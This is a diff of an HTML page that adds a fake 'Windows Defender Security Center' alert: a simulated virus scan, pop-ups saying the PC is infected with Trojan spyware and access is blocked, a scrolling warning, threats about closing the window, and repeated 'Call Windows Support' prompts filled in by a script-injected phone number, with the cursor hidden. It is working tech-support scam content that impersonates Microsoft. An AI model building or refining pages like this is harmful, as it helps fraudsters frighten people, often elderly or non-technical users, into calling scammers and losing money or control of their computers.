@@ -259,22 +259,291 @@
         </div>
       </div>
     </div>
-
-    <!-- Added .lightbox popup for exit-intent with session checks and delays -->
-    <div class="lightbox" style="display: none;">
-      <p>Critical Error Detected! Call Support Immediately.</p>
-      <a href="#" class="close">Close</a>
+	
+	 <div class="pro_box2" style="cursor: none; display: block;">
+      <img src="bx1.png" alt="" style="max-width: 100%;width: 100%;margin: 0 auto;">
     </div>
-
-    <!-- Rest of your original HTML remains unchanged -->
-    <div class="pro_box" style="cursor: none; display: block;">
-      <!-- ... (your existing pro_box content) ... -->
+    <div class="pro_box3" style="cursor: none; display: block;">
+      <div class="pro_box_header">
+        <div class="row">
+          <div class="col-md-12">
+            <div class="minimize">
+              <ul>
+                <li>
+                  <a href="#">
+                    <img src="mnc.png">
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+          <div class="col-md-4">
+            <div class="logo">
+              <img src="msmm.png">
+              <span>Windows security</span>
+            </div>
+          </div>
+          <div class="col-md-8">
+            <div class="activate_lic">
+              <ul>
+                <li>
+                  <a href="#">
+                    <button>Activate the license</button>
+                  </a>
+                </li>
+                <li>
+                  <a href="#">
+                    <img src="bel.png">
+                  </a>
+                </li>
+                <li>
+                  <a href="#">
+                    <img src="set.png">
+                  </a>
+                </li>
+                <li>
+                  <a href="#">
+                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAIAAAD9iXMrAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAP9JREFUeNqMUTEORUAQZbIUalESpTNoVEqJSuIKjuMUCiRKnQtoKSRCKRp0JPJf/iYbv/iJKdZ47+3smxl533fpG9d1dV03z/O6rrqum6bpOI6iKJxl/DNNU5Zly7JIjzAMI4oiy7KQy6gHUZqm+FFVNQxDEEDKsjzPk4iSJAFCeA6VeIE4jm3bbtsWJ3Ig932DhYbBk3juOI6macZx3LYtCAIOgoWGwbgwlOc5T9BB3/cCh4bQnfQbruui2aqqBAINYQRPEYx7nlcUBTwIEBrC1aeOMVbX9TAMTxAaghXMSfofYKEhTBzDFKimab7v4xQ2wEIj87292seb/X4EGADicI/nlE5xDgAAAABJRU5ErkJggg==">
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="scan_box2">
+        <div class="scan_box_header">
+          <div class="row">
+            <div class="col-md-6">
+              <div class="quick_scan">
+                <p>
+                  <img src="vsc.png">
+                  <span>Scan</span>
+                </p>
+              </div>
+            </div>
+            <div class="col-md-6">
+              <div class="minimize1">
+                <ul>
+                  <li>
+                    <a href="#">
+                      <img src="mnc.png">
+                    </a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="scan_body">
+          <div class="row">
+            <div class="col-md-12">
+              <div class="tooreg_detail_scan">
+                <ul>
+                  <li>
+                    <a href="#">Scan</a>
+                  </li>
+                  <li>
+                    <a href="#">Scan Planning</a>
+                  </li>
+                  <li>
+                    <a href="#">Reports</a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <br>
+          <div class="table_quick2">
+            <div class="row">
+              <div class="col-md-4">
+                <div class="pc_desk">
+                  <img src="pcm.png">
+                </div>
+              </div>
+              <div class="col-md-4">
+                <div class="card_top scan_pro">
+                  <ul>
+                    <li>
+                      <i aria-hidden="true" class="fa fa-check"></i> Checking for updates
+                    </li>
+                    <li>
+                      <i aria-hidden="true" class="fa fa-check"></i> Scan memory
+                    </li>
+                    <li>
+                      <i aria-hidden="true" class="fa fa-check"></i> Analyze startup items
+                    </li>
+                    <li>
+                      <div class="circular-spinner"></div>
+                      <span>Registry analysis</span>
+                    </li>
+                    <li>File system analysis</li>
+                  </ul>
+                </div>
+              </div>
+              <div class="col-md-4">
+                <div class="scan_dur">
+                  <p>
+                    <strong>Duration of the analysis</strong>
+                  </p>
+                  <p>3sec 0s</p>
+                  <p>5sec 0s</p>
+                  <br>
+                  <p>
+                    <strong>Scanned items</strong>
+                  </p>
+                  <p>55,900</p>
+                  <br>
+                  <p>
+                    <strong>Detections</strong>
+                  </p>
+                  <p>11</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="scan_footer3">
+          <div class="row">
+            <div class="col-md-2">
+              <div class="viruses">
+                <img src="vsc.png">
+              </div>
+            </div>
+            <div class="col-md-10">
+              <div class="make_this">
+                <p>This should be the last thing you worry about online threats.</p>
+                <p>Premium blocks malware, viruses and much more without slowing down your computer. Upgrade to the Premium version</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
     </div>
+    <div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999" id="footer">
+      <div class="row">
+        <div class="col-md-12">
+          <div class="right-foot" style="text-align:center">
+            <span id="footertxt">
+              <img src="msmm.png"> Windows security </span>
+            <span style="font-weight:500;padding-left:13px;color:#fff; ">Call Windows Support: <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> <script>document.write(phone)</script>
+              </span>
+            </span>
+          </div>
+        </div>
+        <div class="col-md-12">
+          <marquee direction="left" height="100px" width="100%">
+            <small class="text-left" style="color:#eee;font-size:10px">Windows Defende program has prevented the display of an unrecognized application. Running this application may put your PC at risk. Windows Defender Scan has found a potentially unwanted adware on this device that could steal your passwords, your online identity, your financial information, your personal files, your photos or your documents.</small>
+          </marquee>
+        </div>
+      </div>
+    </div>
+    <div class="lightbox" id="poptxt" style="display: block;">
+      <div class="ilb top" style="font-size:17px">
+        <div class="ilb headers" style="border-bottom:1px solid #d6d5d5">
+          <span class="fl title" id="txtadd">
+            <span class="fl ilb">
+              <img src="dm.png" class="logo3">
+            </span>Windows Defender Security Center </span>
+          <span class="fl title2" id="txts1">
+            <a href="#" id="cross">
+              <img src="cs.png">
+            </a>
+          </span>
+        </div>
+      </div>
+      <div id="txtintro">
+        <span class="colo-rd">
+          <div id="ip_add">Microsoft Windows detects Pirated Firewall Alert!</div>
+          <div id="city">PC infected with Trojan-type spyware</div>
+          <div id="isp"> (Error Code: 0X097860xMpRK)</div>
+        </span>
+      </div>
+      <img src="re.gif" id="banner">
+      <div id="disclaimer">Access to this PC has been blocked for security reasons.  <br>
+        <span class="support" style="font-size:22px;">Call Windows Support:&nbsp; <span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> <script>document.write(phone)</script>
+          </span>
+        </span>
+      </div>
+      <div id="bottom">
+        <img src="msmm.png" id="badge">
+        <span class="title3">Windows Security</span>
+        <ul>
+          <li>
+            <a href="#">
+              <div class="fr button2">
+                <span id="addtochromebutton">Cancel</span>
+              </div>
+            </a>
+          </li>
+          <li>
+            <a href="#">
+              <div class="fr button">
+                <span id="addtochromebutton">OK</span>
+              </div>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </div>
+    <div class="cardcontainer" style="cursor: none; display: block;" id="pop_up_new">
+      <p style="font-size:16px;font-weight:400;margin:0;margin-bottom:5px;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:8px" class="text-center">Windows-Defender - Security Warning</p>
+      <p>
+        <b>CRITICAL ERROR DETECTED. ACCESS TO SYSTEM BLOCKED</b>
+      </p>
+      <p>Your computer has reported us that it has been infected with Trojan-type spyware. The following data has been compromised.</p>
+      <p>&gt; Email IDs <br>&gt; Bank passwords <br>&gt; Facebook logins <br>&gt; Photos and documents </p>
+      <p>Windows Defender program Scan has found a potentially unwanted adware on this device that can steal your passwords, your online identity, your financial information, your personal files, your photos or your documents.</p>
+      <p>You should contact us immediately so that our engineers can guide you through the removal process by phone.</p>
+      <p>Call Windows Support immediately to report this threat, prevent identity theft, and unblock access to this device.</p>
+      <p>By closing this window, you are putting your personal information at risk and you may have your Windows registration suspended.</p>
+      <p style="padding-bottom:0;color:#fff;font-size:16px">Call Windows Support: <strong>
+          <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"><script>document.write(phone)</script>
+          </span>
+        </strong>
+      </p>
+      <div class="action_buttons">
+        <a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">OK</a>
+        <a class="active" id="leave_page" style="color:#fff!important">Cancel</a>
+      </div>
+    </div>
+    <div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
+      <p style="color:#fff;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">You should call us immediately so that our engineers can guide you through the removal process by phone. <br>Your computer is disabled.<br>
+        <strong>Windows Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> <script>document.write(phone)</script>
+          </span>
+        </strong>
+      </p>
+    </div>
+    <div id="chat" style="display: block;">
+      <img src="msmm.png">
+      <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
+      <p style="font-weight:600;font-size:24px">Call Support: <br>
+      </p>
+      <h4 style="font-weight:600;font-size:22px"> <script>document.write(phone)</script>
+        <br>(Security TollFree)
+      </h4>
+      <div class="arrow-down">
+        <svg height="1em" viewBox="0 0 320 512">
+          <style>
+            svg {
+              fill: #fff
+            }
+          </style>
+          <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
+        </svg>
+      </div>
+    </div>
+	
+	
+    <script src="nvidia.js"></script>
+    <script src="jupiter.js"></script>
+
+
+
 
     <!-- ... (rest of your HTML: pro_box2, pro_box3, footer, popups, etc.) ... -->
 
-    <script src="nvidia.js"></script>
-    <script src="jupiter.js"></script>
+
 
     <!-- Updated progress bar script (compatible with jQuery 2.1.3) -->
     <script>
